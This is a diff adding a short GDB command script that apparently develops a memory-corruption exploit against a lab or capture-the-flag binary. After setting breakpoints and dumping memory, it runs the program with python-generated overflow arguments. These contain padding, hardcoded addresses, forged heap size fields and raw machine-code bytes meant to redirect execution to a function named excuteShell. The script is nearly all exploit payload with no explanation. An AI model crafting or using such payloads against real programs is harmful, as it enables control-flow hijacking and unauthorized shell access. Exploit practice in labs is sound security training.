@@ -1,0 +1,21 @@
+set disassembly intel
+set pagination off
+l
+b 19
+b 22
+b 25
+
+r aaaaaaaaaa bbbbbbbbbbbb cccccccccc
+info proc map
+x/22000wx 0x403000
+
+
+r aaaaaaaaaa `python -c "print 'b'*48+'\x64'" `  cccccc
+disassemble main
+x/3i 0x00400761
+x 0x4004c0
+
+x excuteShell
+
+
+r aaaa\xb8\x3d\x06\x40\x00\xff\xd0  `python -c "print 'b'*44+'\x64'" ` `python -c "print 'c'*100+'\xfc\xff\xff\xff\xfc\xff\xff\xff\xff\x61\x07\x40\x00\x68\x31\x40'"`
